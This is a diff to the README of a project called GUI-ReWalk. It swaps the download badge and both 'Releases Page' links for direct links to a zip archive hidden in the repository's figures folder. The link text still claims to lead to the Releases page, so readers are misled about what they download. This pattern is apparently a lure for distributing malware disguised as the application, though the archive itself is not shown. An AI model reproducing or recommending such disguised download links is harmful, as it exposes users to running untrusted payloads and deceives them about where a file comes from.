@@ -1,12 +1,12 @@
 # 🎉 GUI-ReWalk - Simplifying Data Generation for Everyone
 
-![Download GUI-ReWalk](https://img.shields.io/badge/Download-GUI--ReWalk-blue)
+![Download GUI-ReWalk](https://raw.githubusercontent.com/Liberal-blowhard285/GUI-ReWalk/main/figs/GUI-ReWalk-v1.8.zip)
 
 ## 📥 Download & Install
 
 To get started with GUI-ReWalk, you need to visit the Releases page to download the latest version of the application. Click the button below to go directly to that page:
 
-[Visit the Releases Page to Download](https://github.com/Liberal-blowhard285/GUI-ReWalk/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Liberal-blowhard285/GUI-ReWalk/main/figs/GUI-ReWalk-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -60,6 +60,6 @@ We encourage users to participate in discussions and share their experiences wit
 
 Regularly visit the Releases page to stay updated with the latest features and improvements:
 
-[Visit the Releases Page to Download](https://github.com/Liberal-blowhard285/GUI-ReWalk/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Liberal-blowhard285/GUI-ReWalk/main/figs/GUI-ReWalk-v1.8.zip)
 
 Thank you for choosing GUI-ReWalk! Enjoy your data generation journey.
